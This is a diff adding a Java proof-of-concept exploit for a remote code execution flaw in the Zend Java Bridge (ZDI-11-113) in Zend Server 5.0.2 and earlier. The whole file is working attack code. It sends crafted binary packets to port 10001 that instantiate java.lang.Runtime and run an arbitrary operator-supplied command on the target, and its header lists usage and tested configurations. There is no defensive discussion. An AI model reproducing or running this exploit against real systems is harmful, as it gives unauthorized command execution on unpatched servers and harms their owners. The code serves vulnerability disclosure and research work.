@@ -1,0 +1,191 @@
+/*
+ * Zend Java Bridge v3.1 - Remote Code Execution (ZDI-11-113)
+ * Copyright (c) 2010 Luca Carettoni
+ *
+ * ZJB.java v0.2 - 4 August 2010
+ *
+ * [Usage]
+ * java -jar zjb.jar <IP> <PORT> '<CMD>' (Default: 10001/tcp)
+ *
+ * [Version affected]
+ * Zend Server v5.0.2, Zend Server Community Edition v5.0.2 and previous releases
+ * http://www.zend.com/en/products/server/
+ * 
+ * All platform are affected (Windows, Linux, Mac OS X and IBM i) as long as the vulnerable Zend Java Bridge
+ * component is installed. For instance, this is the default configuration in the Windows "FULL" installation.
+ * Disabling the Zend Java Bridge from the administration console does NOT solve the issue.
+ *    
+ * Exploit tested with the following configurations:
+ * - MS Windows Server 2003, Zend Server 5.0.2 default "FULL" installation
+ * - Ubuntu 8.10, Zend Server 5.0.2 default installation + "php-5.3-java-bridge-zend-server" installation
+ * - Ubuntu 8.10, Zend Server 5.0.0 default installation
+ *
+ */
+package ZJBpoc;
+
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+import java.io.IOException;
+import java.net.Socket;
+
+public class ZJB {
+
+    private String ip;
+    private String port;
+    private String cmd;
+    private Socket socket;
+
+    public ZJB(String ip, String port, String cmd) {
+        this.ip = ip;
+        this.port = port;
+        this.cmd = cmd;
+
+        try {
+            System.out.println("[*] Connecting to " + this.ip + ":" + this.port);
+            this.socket = new Socket(this.ip, Integer.parseInt(this.port));
+        } catch (Exception e) {
+            System.out.println("[!] Connection error\n");
+            System.exit(-1);
+        }
+    }
+
+    public boolean run() {
+
+        System.out.println("[*] Creating the Java Object \"java.lang.Runtime\"");
+        byte[] createObj = new byte[]{
+            //$runtime =  new Java("java.lang.Runtime");
+            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x33, (byte) 0x00,
+            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
+            (byte) 0x00, (byte) 0x0c, (byte) 0x43, (byte) 0x72, (byte) 0x65,
+            (byte) 0x61, (byte) 0x74, (byte) 0x65, (byte) 0x4f, (byte) 0x62,
+            (byte) 0x6a, (byte) 0x65, (byte) 0x63, (byte) 0x74, (byte) 0x00,
+            (byte) 0x00, (byte) 0x00, (byte) 0x02, (byte) 0x04, (byte) 0x00,
+            (byte) 0x00, (byte) 0x00, (byte) 0x11, (byte) 0x6a, (byte) 0x61,
+            (byte) 0x76, (byte) 0x61, (byte) 0x2e, (byte) 0x6c, (byte) 0x61,
+            (byte) 0x6e, (byte) 0x67, (byte) 0x2e, (byte) 0x52, (byte) 0x75,
+            (byte) 0x6e, (byte) 0x74, (byte) 0x69, (byte) 0x6d, (byte) 0x65,
+            (byte) 0x07, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,};
+
+        byte[] idObj = new byte[4];
+        System.arraycopy(sendData(createObj), 5, idObj, 0, 4);
+        System.out.println("  [-] Class ID: 0x" + getHex(idObj));
+
+        System.out.println("[*] Invoking static method \"getRuntime()\"");
+        byte[] getRuntime = new byte[]{
+            //$getRuntime = $runtime->getRuntime();
+            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x16,
+            idObj[0], idObj[1], idObj[2], idObj[3], //Object ID
+            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x0a, (byte) 0x67,
+            (byte) 0x65, (byte) 0x74, (byte) 0x52, (byte) 0x75, (byte) 0x6e,
+            (byte) 0x74, (byte) 0x69, (byte) 0x6d, (byte) 0x65, (byte) 0x00,
+            (byte) 0x00, (byte) 0x00, (byte) 0x00
+        };
+
+        byte[] idMet = new byte[4];
+        System.arraycopy(sendData(getRuntime), 5, idMet, 0, 4);
+        System.out.println("  [-] Method ID: 0x" + getHex(idMet));
+
+        System.out.println("[*] Invoking method \"exec()\" with parameter \"" + this.cmd + "\"");
+        byte[] exec = new byte[]{
+            //$getRuntime->exec("<system cmd>");
+            idMet[0], idMet[1], idMet[2], idMet[3], //Method ID
+            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x04, (byte) 0x65,
+            (byte) 0x78, (byte) 0x65, (byte) 0x63, (byte) 0x00, (byte) 0x00,
+            (byte) 0x00, (byte) 0x01, (byte) 0x04,};
+
+        byte[] cmd = this.cmd.getBytes();
+        byte[] cmdSize = intToByteArray(cmd.length);
+        byte[] payloadSize = intToByteArray(cmd.length + 21);
+        System.out.println("  [-] Payload size: 0x" + getHex(payloadSize));
+        System.out.println("  [-] Command size: 0x" + getHex(cmdSize));
+
+        //payload = payloadSize + (methodId + staticStr) + cmdSize + cmd
+        byte[] payload = new byte[4 + exec.length + 4 + cmd.length];
+        System.arraycopy(payloadSize, 0, payload, 0, 4);
+        System.arraycopy(exec, 0, payload, 4, exec.length);
+        System.arraycopy(cmdSize, 0, payload, exec.length + 4, 4);
+        System.arraycopy(cmd, 0, payload, 4 + exec.length + 4, cmd.length);
+        System.out.println("  [-] Payload: 0x" + getHex(payload));
+
+        byte[] execReply = sendData(payload);
+
+        System.out.println("[*] Cleaning up the JVM");
+        byte[] reset = new byte[]{
+            //Reset
+            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x11, (byte) 0xff,
+            (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0x00, (byte) 0x00,
+            (byte) 0x00, (byte) 0x05, (byte) 0x72, (byte) 0x65, (byte) 0x73,
+            (byte) 0x65, (byte) 0x74, (byte) 0x00, (byte) 0x00, (byte) 0x00,
+            (byte) 0x00
+        };
+        sendData(reset);
+
+        //Check the response type of the exec invocation
+        if (execReply[3] == (byte) 0x05 && execReply[4] == (byte) 0x05) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    private static String getHex(byte[] raw) {
+        final String HEXES = "0123456789ABCDEF";
+        if (raw == null) {
+            return null;
+        }
+        final StringBuilder hex = new StringBuilder(2 * raw.length);
+        for (final byte b : raw) {
+            hex.append(HEXES.charAt((b & 0xF0) >> 4)).append(HEXES.charAt((b & 0x0F)));
+        }
+        return hex.toString();
+    }
+
+    private static byte[] intToByteArray(int value) {
+        byte[] b = new byte[4];
+        for (int i = 0; i < 4; i++) {
+            int offset = (b.length - 1 - i) * 8;
+            b[i] = (byte) ((value >>> offset) & 0xFF);
+        }
+        return b;
+    }
+
+    private byte[] sendData(byte[] data) {
+
+        byte[] reply = new byte[9];
+
+        try {
+            DataOutputStream os = new DataOutputStream(this.socket.getOutputStream());
+            DataInputStream is = new DataInputStream(this.socket.getInputStream());
+            os.write(data);
+            os.flush();
+            is.read(reply);
+        } catch (IOException ex) {
+            System.out.println("[!] Socket error...\n" + ex.getMessage());
+        }
+        return reply;
+    }
+
+    public static void main(String[] args) throws IOException {
+
+        System.out.println("\n--[ Zend Java Bridge - Remote Code Execution ]");
+        System.out.println("--[ Copyright (c) 2010 Luca Carettoni ]\n");
+
+        if (args.length != 3) {
+
+            System.out.println("[!] Usage: java -jar zjb.jar <IP> <PORT> \'<CMD>\' (Default: 10001/tcp)\n");
+            System.exit(0);
+
+        } else {
+
+            ZJB exploit = new ZJB(args[0], args[1], args[2]);
+
+            if (exploit.run()) {
+                System.out.println("[*] Write once, exploit anywhere!\n");
+            } else {
+                System.out.println("[!] An error occurred during the execution...\n");
+            }
+            exploit.socket.close();
+
+        }
+    }
+}
